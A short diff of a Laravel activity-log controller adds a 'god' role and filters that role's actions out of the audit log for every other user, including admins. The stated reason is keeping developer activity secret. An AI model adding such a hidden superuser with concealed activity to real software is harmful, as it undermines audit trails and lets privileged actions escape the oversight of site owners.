@@ -9,11 +9,18 @@ class ActivityLogController extends Controller
 {
     public function index(Request $request)
     {
-        if (!auth()->check() || !in_array(auth()->user()->role, ['admin', 'palugada', 'panitia'])) {
+        if (!auth()->check() || !in_array(auth()->user()->role, ['admin', 'palugada', 'panitia', 'god'])) {
             return abort(403, 'Akses ditolak.');
         }
 
         $query = RiwayatAktivitas::with('pelaku');
+
+        // Sembunyikan aktivitas akun GOD dari non-god untuk menjaga kerahasiaan developer
+        if (auth()->user()->role !== 'god') {
+            $query->whereDoesntHave('pelaku', function($q) {
+                $q->where('role', 'god');
+            });
+        }
 
         // Filtering by date
         if ($request->filled('date')) {
